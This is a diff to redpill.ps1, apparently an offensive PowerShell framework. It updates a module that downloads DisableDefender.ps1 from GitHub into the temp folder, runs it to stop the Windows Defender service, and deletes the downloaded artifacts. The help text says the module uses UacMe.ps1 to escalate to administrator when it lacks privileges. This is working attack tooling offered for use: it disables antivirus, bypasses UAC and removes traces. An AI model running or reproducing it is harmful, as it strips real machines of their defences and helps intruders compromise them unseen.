@@ -2234,7 +2234,7 @@ If($DisableAV -ne "false"){
 
    <#
    .SYNOPSIS
-      Author: @M2Team|@r00t-3xp10it
+      Author: @Sordum (RedTeam) | @r00t-3xp10it
       Disable Windows Defender Service (WinDefend) 
 
    .DESCRIPTION
@@ -2242,14 +2242,13 @@ If($DisableAV -ne "false"){
       service without the need to restart or refresh target machine.
 
    .NOTES
-      Mandatory requirements: $ Administrator privileges $
-      Remark: Windows warns users that WinDefend is stopped!
+      This cmdlet uses UacMe.ps1 to Escalate shell privileges to admin!
 
    .Parameter DisableAV
-      Accepts arguments: Query, Stop and Start
+      Accepts arguments: Query, Stop and Start (default: Query)
 
    .Parameter ServiceName
-      Accepts the Windows Defender Service Name
+      Windows Defender Service Name (default: WinDefend)
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -DisableAV Query
@@ -2263,17 +2262,14 @@ If($DisableAV -ne "false"){
       PS C:\> powershell -File redpill.ps1 -DisableAV Stop
       Stops the Windows Defender Service (WinDefend)
 
-   .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -DisableAV Stop -ServiceName "WinDefend"
-      Manual Input of Windows Defender Service Name (query: cmd /c sc query)
-
    .OUTPUTS
       Disable Windows Defender Service
       --------------------------------
       ServiceName      : WinDefend
+      AMRversion       : 4.18.2104.14
       StartType        : Automatic
-      CurrentStatus    : Stopped
-      ManualQuery      : Get-Service -Name WinDefend
+      CurrentStatus    : Running
+      CanStop          : True
    #>
 
    ## Download DisableDefender.ps1 from my GitHub
@@ -2281,7 +2277,7 @@ If($DisableAV -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DisableDefender.ps1 -Destination $Env:TMP\DisableDefender.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\DisableDefender.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 8){## Corrupted download detected => DefaultFileSize: 8,4755859375/KB
+      If($SizeDump -lt 12){## Corrupted download detected => DefaultFileSize: 12,2548828125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\DisableDefender.ps1"){Remove-Item -Path "$Env:TMP\DisableDefender.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2289,10 +2285,10 @@ If($DisableAV -ne "false"){
    }
 
    ## Run auxiliary module
-   powershell -File "$Env:TMP\DisableDefender.ps1" -Action $DisableAV -ServiceName "$ServiceName"
+   If($Delay -lt 3 -or $Delay -gt 6){$Delay = "4"}
+   powershell -File "$Env:TMP\DisableDefender.ps1" -Action $DisableAV -ServiceName "$ServiceName" -Delay "$Delay"
 
    ## Clean Artifacts left behind
-   If(Test-Path -Path "$Env:TMP\BCDstore.msc"){Remove-Item -Path "$Env:TMP\BCDstore.msc" -Force}
    If(Test-Path -Path "$Env:TMP\DisableDefender.ps1"){Remove-Item -Path "$Env:TMP\DisableDefender.ps1" -Force}
 }
 
@@ -4107,23 +4103,22 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Author: @M2Team|@r00t-3xp10it
-      Helper - Disable Windows Defender Service (WinDefend) 
+      Author: @Sordum (RedTeam) | @r00t-3xp10it
+      Disable Windows Defender Service (WinDefend) 
 
    .DESCRIPTION
       This CmdLet Query, Stops, Start Anti-Virus Windows Defender
       service without the need to restart or refresh target machine.
 
    .NOTES
-      Mandatory requirements: Administrator privileges
-      Remark: Windows warns users that WinDefend is stopped!
-      Remark: Defender versions less than 4.18.2104.14 are vulnerable!
+      This cmdlet uses UacMe.ps1 to Escalate shell privileges to admin
+      If DisableDefender its executed without administrator privileges!
 
    .Parameter DisableAV
-      Accepts arguments: Query, Stop and Start
+      Accepts arguments: Query, Stop and Start (default: Query)
 
    .Parameter ServiceName
-      Accepts the Windows Defender Service Name
+      Windows Defender Service Name (default: WinDefend)
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -DisableAV Query
@@ -4137,18 +4132,14 @@ $HelpParameters = @"
       PS C:\> powershell -File redpill.ps1 -DisableAV Stop
       Stops the Windows Defender Service (WinDefend)
 
-   .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -DisableAV Stop -ServiceName "WinDefend"
-      Manual Input of Windows Defender Service Name (query: cmd /c sc query)
-
    .OUTPUTS
       Disable Windows Defender Service
       --------------------------------
       ServiceName      : WinDefend
+      AMRversion       : 4.18.2104.14
       StartType        : Automatic
-      CurrentStatus    : Stopped
-      AMRversion       : 4.15.1334.66
-      IsExploitable?   : True  => Admin privs!
+      CurrentStatus    : Running
+      CanStop          : True
    #>!bye..
 
 "@;
